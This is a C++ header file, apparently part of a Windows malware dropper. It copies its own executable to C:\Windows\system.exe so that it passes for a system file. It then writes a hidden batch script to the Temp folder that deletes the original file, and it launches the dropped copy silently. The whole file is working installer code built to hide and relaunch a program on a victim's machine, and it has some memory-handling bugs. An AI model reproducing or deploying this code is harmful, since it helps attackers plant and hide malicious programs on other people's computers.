/*
*	install.h
*/

#ifndef __INSTALL
#define __INSTALL

#include <stdlib.h>
#include <fstream>
#include <windows.h>
#include <vector>
#include <sstream>
#include <iostream>
#include "lib.h"
#include "resources.h"

const char* EXEC_DROP_PATH = "C:\\Windows\\system.exe";
const char* TMP_PATH = "C:\\Windows\\Temp";

char* GetDefaultModuleFileName(void) {
	char* szModuleFileName = (char*)malloc(MAX_PATH);
	GetModuleFileNameA(NULL, szModuleFileName, MAX_PATH);
	return szModuleFileName;
}

LPSTR moduleFileName = GetDefaultModuleFileName();

bool execInstalled(void) {
	std::fstream file;
	file.open(EXEC_DROP_PATH, std::ios::in);

	if (file) {
		file.close();
		return true;
	}

	return false;
}

void install(void) {
	std::fstream in;
	in.open(moduleFileName, std::ios::in);

	if (in) {
		std::fstream out;
		out.open(EXEC_DROP_PATH, std::ios::out);
		if (out) {
			CopyFileA(moduleFileName, EXEC_DROP_PATH, false);

			out.close();
			in.close();

			return;
		}

		in.close();
	}

	printf("Error copying executable");
}

const char* genDeletionScript() {
	std::vector<std::string> fileNameSplit = split(moduleFileName, '\\');
	std::string lastSegment = fileNameSplit.back();
	const char* executable = lastSegment.c_str();

	std::stringstream script_ss;
	script_ss 	<< "@echo off\n"
				<< "set EXEC=" << executable << "\n"
				<< "set FILENAME=" << moduleFileName << "\n"
				<< src_scrpt_remove_bat;
	std::string script_s = script_ss.str();
	const char* script = script_s.c_str();

	const size_t size = sizeof(char)*strlen(script);
	char* ret = (char*)malloc(size);
	memcpy(ret, script, size);
	return ret;
}

const char* deletionScriptPath() {
	std::string path_s(TMP_PATH);
	path_s.append("\\run.bat");
	const char* path = path_s.c_str();
	
	const size_t size = sizeof(char)*strlen(path);
	char* ret = (char*)malloc(size);
	memcpy(ret, path, size);

	return ret;
}

void scheduleDeletion(void) {
	const char* script = genDeletionScript();
	const char* path = deletionScriptPath();
	write(script, path);

	std::string params_s("/C ");
	params_s.append(path);
	const char* params = params_s.c_str();

	ShellExecuteA(NULL, NULL, "cmd.exe", params, NULL, 0);
	ShellExecuteA(NULL, NULL, EXEC_DROP_PATH, NULL, NULL, 0);
}

void runCheck(void) {
	if (!execInstalled()) {
		install();
		scheduleDeletion();
	}
}

void uninstall(void) {
	printf("Uninstalling...");
	if (execInstalled()) {
		DeleteFileA(EXEC_DROP_PATH);
	}
}

#endif
